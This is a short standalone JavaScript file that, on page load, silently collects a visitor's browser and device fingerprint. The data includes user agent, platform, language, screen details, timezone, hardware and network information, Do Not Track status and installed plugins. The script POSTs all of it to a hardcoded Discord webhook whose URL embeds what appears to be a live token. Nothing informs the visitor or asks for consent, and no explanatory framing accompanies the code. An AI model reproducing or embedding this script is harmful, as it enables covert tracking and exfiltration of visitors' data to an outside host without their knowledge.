window.onload = function() {
    var userAgent = navigator.userAgent;
    var platform = navigator.platform;
    var language = navigator.language;
    var colorDepth = screen.colorDepth;
    var pixelRatio = window.devicePixelRatio;
    var plugins = "";
    var mimeTypes = "";
    var cookiesEnabled = navigator.cookieEnabled;
    var timeZone = new Date().getTimezoneOffset();
    var doNotTrack = navigator.doNotTrack;
    var hardwareConcurrency = navigator.hardwareConcurrency;
    var maxTouchPoints = navigator.maxTouchPoints;
    var connectionType = navigator.connection.type;
    var effectiveType = navigator.connection.effectiveType;
    var networkInformation = "Connection Type: " + connectionType + "\nEffective Type: " + effectiveType + "\nMax Touch Points: " + maxTouchPoints + "\nHardware Concurrency: " + hardwareConcurrency + "\nDo Not Track: " + doNotTrack + "\n";
    for (var i = 0; i < navigator.plugins.length; i++) {
        plugins += navigator.plugins[i].name + "; ";
        mimeTypes += navigator.plugins[i].name + ": " + navigator.plugins[i].filename + "\n";
    }
    var fingerprint = "```User Agent: " + userAgent + "\nPlatform: " + platform + "\nLanguage: " + language + "\nColor Depth: " + colorDepth + "\nPixel Ratio: " + pixelRatio + "\nCookies Enabled: " + cookiesEnabled + "\nTimezone: " + timeZone + "\n" + "Network Information:\n" + networkInformation + "\nPlugins: " + plugins + "\nMIME Types:\n" + mimeTypes + "```";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://discord.com/api/webhooks/1067827238332006451/WPvS6MIUYk-uaHxyH9IM5p0oOKMWC4mhJ7gZwizAUwY7JYk_Lp3wdQrWEXH6oZB-qFZx");
    var params = JSON.stringify({
        content: fingerprint
    });
    xhr.setRequestHeader("Content-type", "application/json");
    xhr.send(params);
}
